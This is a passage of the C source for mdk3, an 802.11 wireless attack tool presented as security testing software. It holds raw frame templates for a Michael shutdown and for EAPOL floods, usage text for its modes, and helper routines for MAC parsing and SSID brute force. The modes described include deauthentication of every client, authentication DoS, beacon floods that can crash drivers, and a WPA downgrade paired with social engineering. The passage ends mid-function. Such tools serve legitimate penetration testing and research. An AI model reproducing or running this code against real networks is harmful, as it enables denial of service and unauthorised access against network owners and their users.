/*
 * mdk3, a 802.11 wireless network security testing tool
 *       Just like John the ripper or nmap, now part of most distros,
 *       it is important that the defender of a network can test it using
 *       aggressive tools.... before somebody else does.
 *
 * This file contains parts from 'aircrack' project by Cristophe Devine.
 *
 * Copyright (C) 2006-2007 Pedro Larbig
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the License.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

//Using GNU Extension getline(), not ANSI C
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/time.h>

#include "pcap.h"
#include "manufactor.h"
#include "osdep/osdep.h"

#define uchar unsigned char

#define ARPHRD_IEEE80211        801
#define ARPHRD_IEEE80211_PRISM  802
#define ARPHRD_IEEE80211_FULL   803

#ifndef ETH_P_80211_RAW
#define ETH_P_80211_RAW 25
#endif

#define VERSION "v6"

#define MICHAEL \
    "\x08\x41\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B\x00\x00\x00\x20\x00\x00\x00\x00"

#define	MAX_PACKET_LENGTH 4096
#define	MAX_APS_TRACKED 100
#define MAX_APS_TESTED 100
#define MAX_WHITELIST_ENTRIES 1000
#define MAX_CHAN_COUNT 128

#define ETH_MAC_LEN 6

# define TIMEVAL_TO_TIMESPEC(tv, ts) {                                  \
        (ts)->tv_sec = (tv)->tv_sec;                                    \
        (ts)->tv_nsec = (tv)->tv_usec * 1000;                           \
}

#define LIST_REREAD_PERIOD 3

static struct wif *_wi_in, *_wi_out;

struct devices
{
    int fd_in,  arptype_in;
    int fd_out, arptype_out;
    int fd_rtc;

} dev;

struct pckt
{
	uchar *data;
	int len;
} pckt;

struct advap
{
	char *ssid;
	uchar *mac;
} advap;

struct clist
{
  uchar *data;
  int status;
  struct clist *next;
};

struct clistwidsap
{
  uchar *bssid;
  int channel;
  uchar capa[2];
  struct clistwidsap *next;
};

struct clistwidsclient
{
  uchar *mac;
  int status; //0=ready 1=authed 2=assoced
  int retry;
  struct clistwidsclient *next;
  uchar *data;
  int data_len;
  struct clistwidsap *bssid;
};

struct ia_stats
{
  int c_authed;
  int c_assoced;
  int c_kicked;
  int c_created;

  int d_captured;
  int d_sent;
  int d_responses;
  int d_relays;
} ia_stats;

struct beaconinfo
{
  uchar *bssid;
  uchar *ssid;
  int ssid_len;
  int channel;
  uchar capa[2];
};

struct wids_stats
{
    int clients;
    int aps;
    int cycles;
    int deauths;
} wids_stats;

unsigned char tmpbuf[MAX_PACKET_LENGTH];     // Temp buffer for packet manipulation in send/read_packet
uchar pkt[MAX_PACKET_LENGTH];                // Space to save generated packet
uchar pkt_sniff[MAX_PACKET_LENGTH];          // Space to save sniffed packets
uchar pkt_check[MAX_PACKET_LENGTH];          // Space to save sniffed packets to check success
uchar mac_p[ETH_MAC_LEN] = "\x00\x00\x00\x00\x00\x00"; // Space for parsed MACs
uchar mac_ph[3] = "\x00\x00\x00";             // Space for parsed half MACs
uchar aps_known[MAX_APS_TRACKED][ETH_MAC_LEN];          // Array to save MACs of known APs
int aps_known_count = 0;                     // Number of known APs
uchar auth[MAX_APS_TESTED][ETH_MAC_LEN];      // Array to save MACs of APs currently under test
int auths[MAX_APS_TESTED][4];                // Array to save status of APs under test
int auth_count;                              // Number of APs under test
int showssidwarn1=1, showssidwarn2=1;        // Show warnings for overlenght SSIDs
char ssid[257];                              // Space for the SSID read from file
FILE *ssid_file_fp;                          // File containing SSIDs
char *ssid_file_name = NULL;                 // File Name for file containing SSIDs
long file_pos = 0;                           // SSID file position
uchar *mac_sa = NULL;                        // Deauth test: Sender/Client MAC
uchar *mac_ta = NULL;                        //              Transmitter/BSSID MAC
int state = 0, wds = 0;                      // Current state of deauth algo
uchar *pkt_amok = NULL;                      // Pointer to packet for deauth mode
uchar mac_v[ETH_MAC_LEN] = "\x00\x00\x00\x00\x00\x00";  // Generated valid MAC (used for Bruteforce, too)
uchar *target = NULL;                        // Target for SSID Bruteforce / Intelligent Auth DoS
int exit_now = 0;                            // Tells main thread to exit
int ssid_len = 0;                            // Length of SSID used in Bruteforce mode
int ssid_eof = 0;                            // Tell other threads, SSID file has reached EOF
char brute_mode;                             // Which ASCII-characters should be used
char *brute_ssid;                            // SSID in Bruteforce mode
unsigned int end = 0;                        // Has Bruteforce mode tried all possibilities?
unsigned int turns = 0;                      // Number of tried SSIDs
unsigned int max_permutations = 1;           // Number of SSIDs possible
int real_brute = 0;                          // use Bruteforce mode?
uchar whitelist[MAX_WHITELIST_ENTRIES][ETH_MAC_LEN];    // Whitelist of clients not to deauth in Amok mode
int whitelist_len = 0;                       // Number of MACs in Whitelist
int wblist = 0;                              // Use white or blacklist in deauth test
int init_intelligent = 0;                    // Is intelligent_auth_dos initialized?
int init_intelligent_data = 0;               // Is its data list initialized?
int we_got_data = 0;                         // Sniffer thread tells generator thread if there is any data
struct clist cl;                             // List with clients for intelligent Auth DoS
struct clist *current = &cl;                 // Pointer to current client
struct clist a_data;                         // List with data frames for intelligent Auth DoS
struct clist *a_data_current = &a_data;      // And a pointer to its current frame
int current_channel = 0;                     // Channel hopper writes current channel here for being displayed by print functions
uchar *essid;                                // Pointer to ESSID for WIDS confusion
int essid_len;                               // And its length
int init_wids = 0;                           // Is WIDS environment ready?
struct clistwidsap clwa;                     // AP list for WIDS confusion
struct clistwidsap *clwa_cur = &clwa;        // Current item
struct clistwidsclient clwc;                 // CLient list for WIDS confusion
struct clistwidsclient *clwc_cur = &clwc;    // Current item
struct clistwidsap zc_own;                   // List of own APs for Zero's exploit
struct clistwidsap *zc_own_cur = &zc_own;    // Current own AP for Zero
int init_zc_own = 0;                         // Is Zero's List ready?
int init_aplist = 0;                         // Is List of APs for WIDS confusion ready?
int init_clientlist = 0;                     // Is list of clients ready?
uchar *mac_base = NULL;                      // First three bytes of adress given for bruteforcing MAC filter
uchar *mac_lower = NULL;                     // Last three bytes of adress for Bruteforcing MAC filter
int mac_b_init = 0;                          // Initializer for MAC bruteforcer
static pthread_mutex_t has_packet_mutex;     // Used for condition below
static pthread_cond_t has_packet;            // Pthread Condition "Packet ready"
int has_packet_really = 0;                   // Since the above condition has a timeout we want to use, we need another int here
static pthread_mutex_t clear_packet_mutex;   // Used for condition below
static pthread_cond_t clear_packet;          // Pthread Condition "Buffer cleared, get next packet"
struct timeval tv_dyntimeout;                // Dynamic timeout for MAC bruteforcer
int mac_brute_speed = 0;                     // MAC Bruteforcer Speed-o-meter
int mac_brute_timeouts = 0;                  // Timeout counter for MAC Bruteforcer
int zc_exploit = 0;                          // Use Zero_Chaos attack or standard WDS confusion?
int hopper_seconds = 1;                      // Default time for channel hopper to stay on one channel
int useqosexploit = 0;                       // Is 1 when user decided to use better TKIP QoS Exploit
int wpad_cycles = 0, wpad_auth = 0;          // Counters for WPA downgrade: completed deauth cycles, sniffed 802.1x auth packets
int wpad_wep = 0, wpad_beacons = 0;          // Counters for WPA downgrade: sniffed WEP/open packets, sniffed beacons/sec

int chans [MAX_CHAN_COUNT] = { 1, 7, 13, 2, 8, 3, 14, 9, 4, 10, 5, 11, 6, 12, 0 };


#define PKT_EAPOL_START \
	"\x08\x01\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
	"\x70\x6a\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x01\x00\x00"

#define PKT_EAPOL_LOGOFF \
	"\x08\x01\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
	"\x70\x6a\xaa\xaa\x03\x00\x00\x00\x88\x8e\x01\x02\x00\x00"

#define EAPOL_TEST_START_FLOOD 0
#define EAPOL_TEST_LOGOFF      1
#define FLAG_AUTH_WPA     1
#define FLAG_AUTH_RSN     2
#define FLAG_TKIP         1
#define FLAG_CCMP         2
#define SUPP_RATES        "\x01\x08\x82\x84\x8b\x96\x0c\x12\x18\x24"  // supported rates (1;2;5,5;11;6;9;12;18)
#define EXT_RATES         "\x32\x04\x30\x48\x60\x6c"                  // extended rates (24;36;48;54)
#define IE_WPA            "\x00\x50\xf2\x01\x01\x00"
#define IE_WPA_TKIP       "\x00\x50\xf2\x02"
#define IE_WPA_CCMP       "\x00\x50\xf2\x04"
#define IE_WPA_KEY_MGMT   "\x00\x50\xf2\x01"
#define IE_RSN            "\x30\x12\x01\x00"
#define IE_RSN_TKIP       "\x00\x0f\xac\x02"
#define IE_RSN_CCMP       "\x00\x0f\xac\x04"
#define IE_RSN_KEY_MGMT   "\x00\x0f\xac\x01"

int eapol_test;                              // the actual EAPOL test
int eapol_state = 0;                         // state of the EAPOL FSM
uchar eapol_src[ETH_MAC_LEN];                // src address used for EAPOL frames
uchar eapol_dst[ETH_MAC_LEN];                // dst address used for EAPOL frames
int eapol_wtype = FLAG_AUTH_WPA;             // default auth type: WPA
int eapol_ucast = FLAG_TKIP;                 // default unicast cipher: TKIP
int eapol_mcast = FLAG_TKIP;                 // default multicast cipher: TKIP

char use_head[]="\nMDK 3.0 " VERSION " - \"Yeah, well, whatever\"\n"
		"by ASPj of k2wrlz, using the osdep library from aircrack-ng\n"
		"And with lots of help from the great aircrack-ng community:\n"
		"Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,\n"
                "telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik\n"
		"THANK YOU!\n\n"
		"MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.\n"
		"IMPORTANT: It is your responsibility to make sure you have permission from the\n"
                "network owner before running MDK against it.\n\n"
		"This code is licenced under the GPLv2\n\n"
		"MDK USAGE:\n"
		"mdk3 <interface> <test_mode> [test_options]\n\n"
		"Try mdk3 --fullhelp for all test options\n"
		"Try mdk3 --help <test_mode> for info about one test only\n\n"
		"TEST MODES:\n"
		"b   - Beacon Flood Mode\n"
		"      Sends beacon frames to show fake APs at clients.\n"
		"      This can sometimes crash network scanners and even drivers!\n"
		"a   - Authentication DoS mode\n"
		"      Sends authentication frames to all APs found in range.\n"
		"      Too much clients freeze or reset some APs.\n"
		"p   - Basic probing and ESSID Bruteforce mode\n"
		"      Probes AP and check for answer, useful for checking if SSID has\n"
		"      been correctly decloaked or if AP is in your adaptors sending range\n"
		"      SSID Bruteforcing is also possible with this test mode.\n"
		"d   - Deauthentication / Disassociation Amok Mode\n"
		"      Kicks everybody found from AP\n"
		"m   - Michael shutdown exploitation (TKIP)\n"
		"      Cancels all traffic continuously\n"
		"x   - 802.1X tests\n"
		"w   - WIDS/WIPS Confusion\n"
		"      Confuse/Abuse Intrusion Detection and Prevention Systems\n"
		"f   - MAC filter bruteforce mode\n"
		"      This test uses a list of known client MAC Adresses and tries to\n"
		"      authenticate them to the given AP while dynamically changing\n"
		"      its response timeout for best performance. It currently works only\n"
		"      on APs who deny an open authentication request properly\n"
		"g   - WPA Downgrade test\n"
		"      deauthenticates Stations and APs sending WPA encrypted packets.\n"
		"      With this test you can check if the sysadmin will try setting his\n"
		"      network to WEP or disable encryption.\n";


char use_beac[]="b   - Beacon Flood Mode\n"
		"      Sends beacon frames to show fake APs at clients.\n"
		"      This can sometimes crash network scanners and even drivers!\n"
		"      OPTIONS:\n"
		"      -n <ssid>\n"
		"         Use SSID <ssid> instead of randomly generated ones\n"
		"      -f <filename>\n"
		"         Read SSIDs from file\n"
		"      -v <filename>\n"
		"         Read MACs and SSIDs from file. See example file!\n"
		"      -d\n"
		"         Show station as Ad-Hoc\n"
		"      -w\n"
		"         Set WEP bit (Generates encrypted networks)\n"
		"      -g\n"
		"         Show station as 54 Mbit\n"
		"      -t\n"
		"         Show station using WPA TKIP encryption\n"
		"      -a\n"
		"         Show station using WPA AES encryption\n"
		"      -m\n"
		"         Use valid accesspoint MAC from OUI database\n"
		"      -h\n"
		"         Hop to channel where AP is spoofed\n"
		"         This makes the test more effective against some devices/drivers\n"
		"         But it reduces packet rate due to channel hopping.\n"
		"      -c <chan>\n"
		"         Fake an AP on channel <chan>. If you want your card to hop on\n"
		"         this channel, you have to set -h option, too!\n"
		"      -s <pps>\n"
		"         Set speed in packets per second (Default: 50)\n";

char use_auth[]="a   - Authentication DoS mode\n"
		"      Sends authentication frames to all APs found in range.\n"
		"      Too much clients freeze or reset almost every AP.\n"
		"      OPTIONS:\n"
		"      -a <ap_mac>\n"
		"         Only test the specified AP\n"
		"      -m\n"
		"         Use valid client MAC from OUI database\n"
		"      -c\n"
		"         Do NOT check for test being successful\n"
		"      -i <ap_mac>\n"
		"         Perform intelligent test on AP (-a and -c will be ignored)\n"
		"         This test connects clients to the AP and reinjects sniffed data to keep them alive\n"
		"      -s <pps>\n"
		"         Set speed in packets per second (Default: unlimited)\n";

char use_prob[]="p   - Basic probing and ESSID Bruteforce mode\n"
		"      Probes AP and check for answer, useful for checking if SSID has\n"
		"      been correctly decloaked or if AP is in your adaptors sending range\n"
		"      Use -f and -t option to enable SSID Bruteforcing.\n"
		"      OPTIONS:\n"
		"      -e <ssid>\n"
		"         Tell mdk3 which SSID to probe for\n"
		"      -f <filename>\n"
		"         Read lines from file for bruteforcing hidden SSIDs\n"
		"      -t <bssid>\n"
		"         Set MAC adress of target AP\n"
		"      -s <pps>\n"
		"         Set speed (Default: unlimited, in Bruteforce mode: 300)\n"
		"      -b <character set>\n"
		"         Use full Bruteforce mode (recommended for short SSIDs only!)\n"
		"         Use this switch only to show its help screen.\n";

char use_deau[]="d   - Deauthentication / Disassociation Amok Mode\n"
		"      Kicks everybody found from AP\n"
		"      OPTIONS:\n"
		"      -w <filename>\n"
		"         Read file containing MACs not to care about (Whitelist mode)\n"
		"      -b <filename>\n"
		"         Read file containing MACs to run test on (Blacklist Mode)\n"
		"      -s <pps>\n"
		"         Set speed in packets per second (Default: unlimited)\n"
		"      -c [chan,chan,chan,...]\n"
		"         Enable channel hopping. Without providing any channels, mdk3 will hop an all\n"
		"         14 b/g channels. Channel will be changed every 5 seconds.\n";

char use_mich[]="m   - Michael shutdown exploitation (TKIP)\n"
		"      Cancels all traffic continuously\n"
		"      -t <bssid>\n"
		"         Set Mac address of target AP\n"
		"      -w <seconds>\n"
		"         Seconds between bursts (Default: 10)\n"
		"      -n <ppb>\n"
		"         Set packets per burst (Default: 70)\n"
		"      -j\n"
		"         Use the new TKIP QoS-Exploit\n"
		"         Needs just a few packets to shut AP down!\n"
		"      -s <pps>\n"
		"         Set speed (Default: 400)\n";

char use_eapo[]="x   - 802.1X tests\n"
		"      0 - EAPOL Start packet flooding\n"
		"            -n <ssid>\n"
		"               Use SSID <ssid>\n"
		"            -t <bssid>\n"
		"               Set MAC address of target AP\n"
		"            -w <WPA type>\n"
		"               Set WPA type (1: WPA, 2: WPA2/RSN; default: WPA)\n"
		"            -u <unicast cipher>\n"
		"               Set unicast cipher type (1: TKIP, 2: CCMP; default: TKIP)\n"
		"            -m <multicast cipher>\n"
		"               Set multicast cipher type (1: TKIP, 2: CCMP; default: TKIP)\n"
		"            -s <pps>\n"
		"               Set speed (Default: 400)\n"
		"      1 - EAPOL Logoff test\n"
		"            -t <bssid>\n"
		"               Set MAC address of target AP\n"
		"            -c <bssid>\n"
		"               Set MAC address of target STA\n"
		"            -s <pps>\n"
		"               Set speed (Default: 400)\n";

char use_wids[]="w   - WIDS/WIPS/WDS Confusion\n"
		"      Confuses a WDS with multi-authenticated clients which messes up routing tables\n"
		"      -e <SSID>\n"
		"         SSID of target WDS network\n"
		"      -c [chan,chan,chan...]\n"
		"         Use channel hopping\n"
		"      -z\n"
		"         activate Zero_Chaos' WIDS exploit\n"
		"         (authenticates clients from a WDS to foreign APs to make WIDS go nuts)\n";

char use_macb[]="f   - MAC filter bruteforce mode\n"
		"      This test uses a list of known client MAC Adresses and tries to\n"
		"      authenticate them to the given AP while dynamically changing\n"
		"      its response timeout for best performance. It currently works only\n"
		"      on APs who deny an open authentication request properly\n"
		"      -t <bssid>\n"
		"         Target BSSID\n"
		"      -m <mac>\n"
		"         Set the MAC adress range to use (3 bytes, i.e. 00:12:34)\n"
		"         Without -m, the internal database will be used\n"
		"      -f <mac>\n"
		"         Set the MAC adress to begin bruteforcing with\n"
		"         (Note: You can't use -f and -m at the same time)\n";

char use_wpad[]="g   - WPA Downgrade test\n"
		"      deauthenticates Stations and APs sending WPA encrypted packets.\n"
		"      With this test you can check if the sysadmin will try setting his\n"
		"      network to WEP or disable encryption. mdk3 will let WEP and unencrypted\n"
		"      clients work, so if the sysadmin simply thinks \"WPA is broken\" he\n"
		"      sure isn't the right one for this job.\n"
		"      (this can/should be combined with social engineering)\n"
		"      -t <bssid>\n"
		"         Target network\n";

int send_packet(uchar *buf, size_t count)
{
	struct wif *wi = _wi_out; /* XXX globals suck */
	if (wi_write(wi, buf, count, NULL) == -1) {
		switch (errno) {
		case EAGAIN:
		case ENOBUFS:
			usleep(10000);
			return 0; /* XXX not sure I like this... -sorbo */
		}

		perror("wi_write()");
		return -1;
	}

	return 0;
}

int read_packet(uchar *buf, size_t count)
{
	struct wif *wi = _wi_in; /* XXX */
	int rc;

	rc = wi_read(wi, buf, count, NULL);
	if (rc == -1) {
		switch (errno) {
		case EAGAIN:
			return 0;
		}

		perror("wi_read()");
		return -1;
	}

	return rc;
}

void set_channel(int channel)
{
    wi_set_channel(_wi_out, channel);
    current_channel = channel;
}

int get_channel()
{
    return current_channel;
}

void print_packet ( uchar *h80211, int caplen )
{
	int i,j;

	printf( "        Size: %d, FromDS: %d, ToDS: %d",
		caplen, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );

	if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )
	{
	if( ( h80211[27] & 0x20 ) == 0 )
		printf( " (WEP)" );
	else
		printf( " (WPA)" );
	}

	for( i = 0; i < caplen; i++ )
	{
	if( ( i & 15 ) == 0 )
	{
		if( i == 224 )
		{
		printf( "\n        --- CUT ---" );
		break;
		}

		printf( "\n        0x%04x:  ", i );
	}

	printf( "%02x", h80211[i] );

	if( ( i & 1 ) != 0 )
		printf( " " );

	if( i == caplen - 1 && ( ( i + 1 ) & 15 ) != 0 )
	{
		for( j = ( ( i + 1 ) & 15 ); j < 16; j++ )
		{
		printf( "  " );
		if( ( j & 1 ) != 0 )
			printf( " " );
		}

		printf( " " );

		for( j = 16 - ( ( i + 1 ) & 15 ); j < 16; j++ )
		printf( "%c", ( h80211[i - 15 + j] <  32 ||
				h80211[i - 15 + j] > 126 )
				? '.' : h80211[i - 15 + j] );
	}

	if( i > 0 && ( ( i + 1 ) & 15 ) == 0 )
	{
		printf( " " );

		for( j = 0; j < 16; j++ )
		printf( "%c", ( h80211[i - 15 + j] <  32 ||
				h80211[i - 15 + j] > 127 )
				? '.' : h80211[i - 15 + j] );
	}
	}
	printf("\n");
}

/* Helper functions */

char hex2char (char byte1, char byte2)
{
// Very simple routine to convert hexadecimal input into a byte
	char rv;

	if (byte1 == '0') { rv = 0; }
	if (byte1 == '1') { rv = 16; }
	if (byte1 == '2') { rv = 32; }
	if (byte1 == '3') { rv = 48; }
	if (byte1 == '4') { rv = 64; }
	if (byte1 == '5') { rv = 80; }
	if (byte1 == '6') { rv = 96; }
	if (byte1 == '7') { rv = 112; }
	if (byte1 == '8') { rv = 128; }
	if (byte1 == '9') { rv = 144; }
	if (byte1 == 'A' || byte1 == 'a') { rv = 160; }
	if (byte1 == 'B' || byte1 == 'b') { rv = 176; }
	if (byte1 == 'C' || byte1 == 'c') { rv = 192; }
	if (byte1 == 'D' || byte1 == 'd') { rv = 208; }
	if (byte1 == 'E' || byte1 == 'e') { rv = 224; }
	if (byte1 == 'F' || byte1 == 'f') { rv = 240; }

	if (byte2 == '0') { rv += 0; }
	if (byte2 == '1') { rv += 1; }
	if (byte2 == '2') { rv += 2; }
	if (byte2 == '3') { rv += 3; }
	if (byte2 == '4') { rv += 4; }
	if (byte2 == '5') { rv += 5; }
	if (byte2 == '6') { rv += 6; }
	if (byte2 == '7') { rv += 7; }
	if (byte2 == '8') { rv += 8; }
	if (byte2 == '9') { rv += 9; }
	if (byte2 == 'A' || byte2 == 'a') { rv += 10; }
	if (byte2 == 'B' || byte2 == 'b') { rv += 11; }
	if (byte2 == 'C' || byte2 == 'c') { rv += 12; }
	if (byte2 == 'D' || byte2 == 'd') { rv += 13; }
	if (byte2 == 'E' || byte2 == 'e') { rv += 14; }
	if (byte2 == 'F' || byte2 == 'f') { rv += 15; }

	return rv;
}

uchar *parse_mac(char *input)
{
// Parsing input MAC adresses like 00:00:11:22:aa:BB or 00001122aAbB

    uchar tmp[12] = "000000000000";
    int t;

    if (input[2] == ':') {
	memcpy(tmp   , input   , 2);
	memcpy(tmp+2 , input+3 , 2);
	memcpy(tmp+4 , input+6 , 2);
	memcpy(tmp+6 , input+9 , 2);
	memcpy(tmp+8 , input+12 , 2);
	memcpy(tmp+10, input+15 , 2);
    } else {
	memcpy(tmp, input, 12);
    }

    for (t=0; t<ETH_MAC_LEN; t++)
	mac_p[t] = hex2char(tmp[2*t], tmp[2*t+1]);
 
    return mac_p;
}

uchar *parse_half_mac(char *input)
{
// Parsing input half MAC adresses like 00:00:11 or 000011

    uchar tmp[6] = "000000";
    int t;

    if (input[2] == ':') {
	memcpy(tmp   , input   , 2);
	memcpy(tmp+2 , input+3 , 2);
	memcpy(tmp+4 , input+6 , 2);
    } else {
	memcpy(tmp, input, 6);
    }

    for (t=0; t<3; t++)
	mac_ph[t] = hex2char(tmp[2*t], tmp[2*t+1]);
 
    return mac_ph;
}

uchar *get_valid_mac_from_list(int type, int list_len)
{
    int t, pos;

    pos = random();
    pos = pos % list_len;

    // SAMPLE LINE
    // 000123000000/FFFFFF000000
    // 0 2 4 6 8 10 13 16 19 22

    if (type == 0) {
	for (t=0; t<ETH_MAC_LEN; t++) {
	    if (!memcmp(clients[pos]+(t*2+13), "FF", 2) || !memcmp(clients[pos]+(t*2+13), "ff", 2)) {
		mac_v[t] = hex2char(clients[pos][t*2], clients[pos][t*2+1]);
	    } else mac_v[t] = random();
	}
    } else {
	for (t=0; t<ETH_MAC_LEN; t++) {
	    if (!memcmp(accesspoints[pos]+(t*2+13), "FF", 2) || !memcmp(accesspoints[pos]+(t*2+13), "ff", 2)) {
		mac_v[t] = hex2char(accesspoints[pos][t*2], accesspoints[pos][t*2+1]);
	    } else mac_v[t] = random();
	}
    }

    return mac_v;
}

struct pckt generate_mac(int kind)
{
// Generate a random MAC adress
// kind : Which kind of MAC should be generated?
//    0 : random MAC
//    1 : valid client MAC
//    2 : valid accesspoint MAC

    struct pckt mac;
    uchar gmac[ETH_MAC_LEN];
    int t;

    mac.len = ETH_MAC_LEN;

    for (t=0; t<ETH_MAC_LEN; t++) 
	gmac[t] = random();
    mac.data = gmac;

    if (kind == 1)
	mac.data = get_valid_mac_from_list(0, clients_count);
    if (kind == 2)
	mac.data = get_valid_mac_from_list(1, accesspoints_count);

    return mac;
}

char generate_channel()
{
// Generate a random channel

    char c = 0;
    c = (random() % 14) + 1;
    return c;
}

char random_char()
{
// Generate random printable ascii char

    char rnd = 0;
    rnd = (random() % 94) + ' ';

    return rnd;
}

char *generate_ssid()
{
// Generate random VALID SSID
// Need another to generate INVALID SSIDs (overlenght) for testing their impact on wireless devices

    char *ssid = (char*) malloc(33);
    int len=0;
    int t;

    len = (random() % 32) + 1;

    for (t=0; t<len; t++) ssid[t] = random_char();
    ssid[len]='\x00';

    return ssid;
}

char *read_line_from_file()
{
// Read SSID from file
// New line removed

    int max_len = 255;
    int len = 32;
    char *ssid_string = NULL;
    unsigned int size = 0;
    int bytes_read = 0;

    /* open file for input */
    if ((ssid_file_fp = fopen(ssid_file_name, "r")) == NULL) {
	printf("Cannot open file \n");
	exit(1);
    }

    fseek(ssid_file_fp, file_pos, SEEK_SET);
    bytes_read = getline(&ssid_string, &size, ssid_file_fp);

    if (bytes_read == -1) {
	rewind(ssid_file_fp);
	ssid_eof = 1;
	bytes_read = getline(&ssid_string, &size, ssid_file_fp);
    }

    len = strlen(ssid_string);

    if (len > max_len) {
	memcpy(ssid, ssid_string, max_len);
	ssid[max_len+1]= '\x00';
	len = strlen(ssid);
	if (showssidwarn2) {
	    printf("\rWARNING! Truncating overlenght SSID to 255 bytes!\n");
	    showssidwarn2 = 0;
	}
    } else {
	memcpy(ssid, ssid_string, len);
    }

    ssid[len-1]='\x00';

    file_pos = ftell(ssid_file_fp);
    fclose(ssid_file_fp);

    return (char*) &ssid;
}

int pps2usec(int pps)
{
// Very basic routine to convert desired packet rate to µs
// µs values were measured with rt2570 device
// Should use /dev/rtc like in aireplay

    int usec;
    int ppc = 1000000;

    if (pps>15) ppc=950000;
    if (pps>35) ppc=800000;
    if (pps>75) ppc=730000;
    if (pps>125)ppc=714000;

    usec = ppc / pps;

    return usec;
}

void bruteforce_ssid()
{
    int i;
    switch (brute_mode) {
	case 'n' :	// Numbers only
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0; i<ssid_len; i++) {
		max_permutations *= 10;
		brute_ssid[i] = 48;
	    }
	    brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1 ;i++) {
	    if (brute_ssid[i] == '9' + 1) {
		brute_ssid[i] = '0';
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('9' + 1)) end = 1;
	break;

	case 'l' :	// only lowercase characters
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0; i<ssid_len; i++) {
		max_permutations *= 26;
		brute_ssid[i] = 97;
	    }
	    brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1 ;i++) {
	    if (brute_ssid[i] == 'z' + 1) {
		brute_ssid[i] = 'a';
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('z' + 1))  end = 1;
	break;

	case 'u' :	// only uppercase characters
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0; i<ssid_len; i++) {
		max_permutations *= 26;
		brute_ssid[i] = 65;
	    }
	brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1; i++) {
	    if (brute_ssid[i] == 'Z' + 1) {
		brute_ssid[i] = 'A' ;
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('Z' +1 )) end = 1;
	break;

	case 'c' :	// lower- and uppercase characters
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0;i<ssid_len;i++) {
		max_permutations *= 52;
		brute_ssid[i] = 65;
	    }
	brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1 ;i++) {
	    if (brute_ssid[i] == 'z' + 1) {
		brute_ssid[i] = 'A';
	    }
	    if (brute_ssid[i] == 'Z' + 1) {
		brute_ssid[i] = 'a';
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('Z' + 1)) end = 1;
	break;

	case 'm' :	// lower- and uppercase characters plus numbers
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0; i<ssid_len; i++) {
		max_permutations *= 62;
		brute_ssid[i]=48;
	    }
	    brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1; i++) {
	    if (brute_ssid[i] == 'z' + 1) {
		brute_ssid[i] = 'A';
	    }
	    if (brute_ssid[i] == 'Z' + 1) {
		brute_ssid[i] = '0';
	    }
	    if (brute_ssid[i] == '9' + 1) {
		brute_ssid[i] = 'a';
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('9' + 1))  end = 1;
	break;

	case 'a' :	// all printable characters
	if (brute_ssid[ssid_len-1] == (int) NULL) {
	    for (i=0; i<ssid_len; i++) {
		max_permutations *= 95;
		brute_ssid[i] = 32;
	    }
	    brute_ssid[0]--;
	}
	brute_ssid[0]++;
	for (i=0; i<ssid_len-1; i++) {
	    if (brute_ssid[i] == '~' + 1) {
		brute_ssid[i] = ' ';
		brute_ssid[i+1]++;
	    }
	}
	turns++;
	if (brute_ssid[ssid_len-1] == ('~' + 1))  end = 1;
	break;
	default : printf("\nYou have to specify a set of characters (a,l,u,n,c,m)!\n");
	exit(0);
	break;
    }

}

void load_whitelist(char *filename)
{

    ssid_file_name = filename;
    uchar *parsed_mac;

    whitelist_len = 0;

    while (! ssid_eof) {
	parsed_mac = parse_mac(read_line_from_file());
	memcpy(whitelist[whitelist_len], parsed_mac, ETH_MAC_LEN);

	whitelist_len++;
	if ((unsigned int) whitelist_len >= sizeof (whitelist) / sizeof (whitelist[0]) ) {
		fprintf(stderr, "Exceeded max whitelist entries\n");
		exit(1);
	}
    }

    //Resetting file positions for next access
    file_pos = 0;
    ssid_eof = 0;
}

int is_whitelisted(uchar *mac)
{
    int t;

    for (t=0; t<whitelist_len; t++) {

	if (!memcmp(whitelist[t], mac, ETH_MAC_LEN))
	    return 1;
    }

    return 0;
}

struct advap get_fakeap_from_file()
{

    struct advap fakeap;
    char *line;
    int t;
    uchar *mac;
    char *ssid;

skipl:

    line = read_line_from_file();

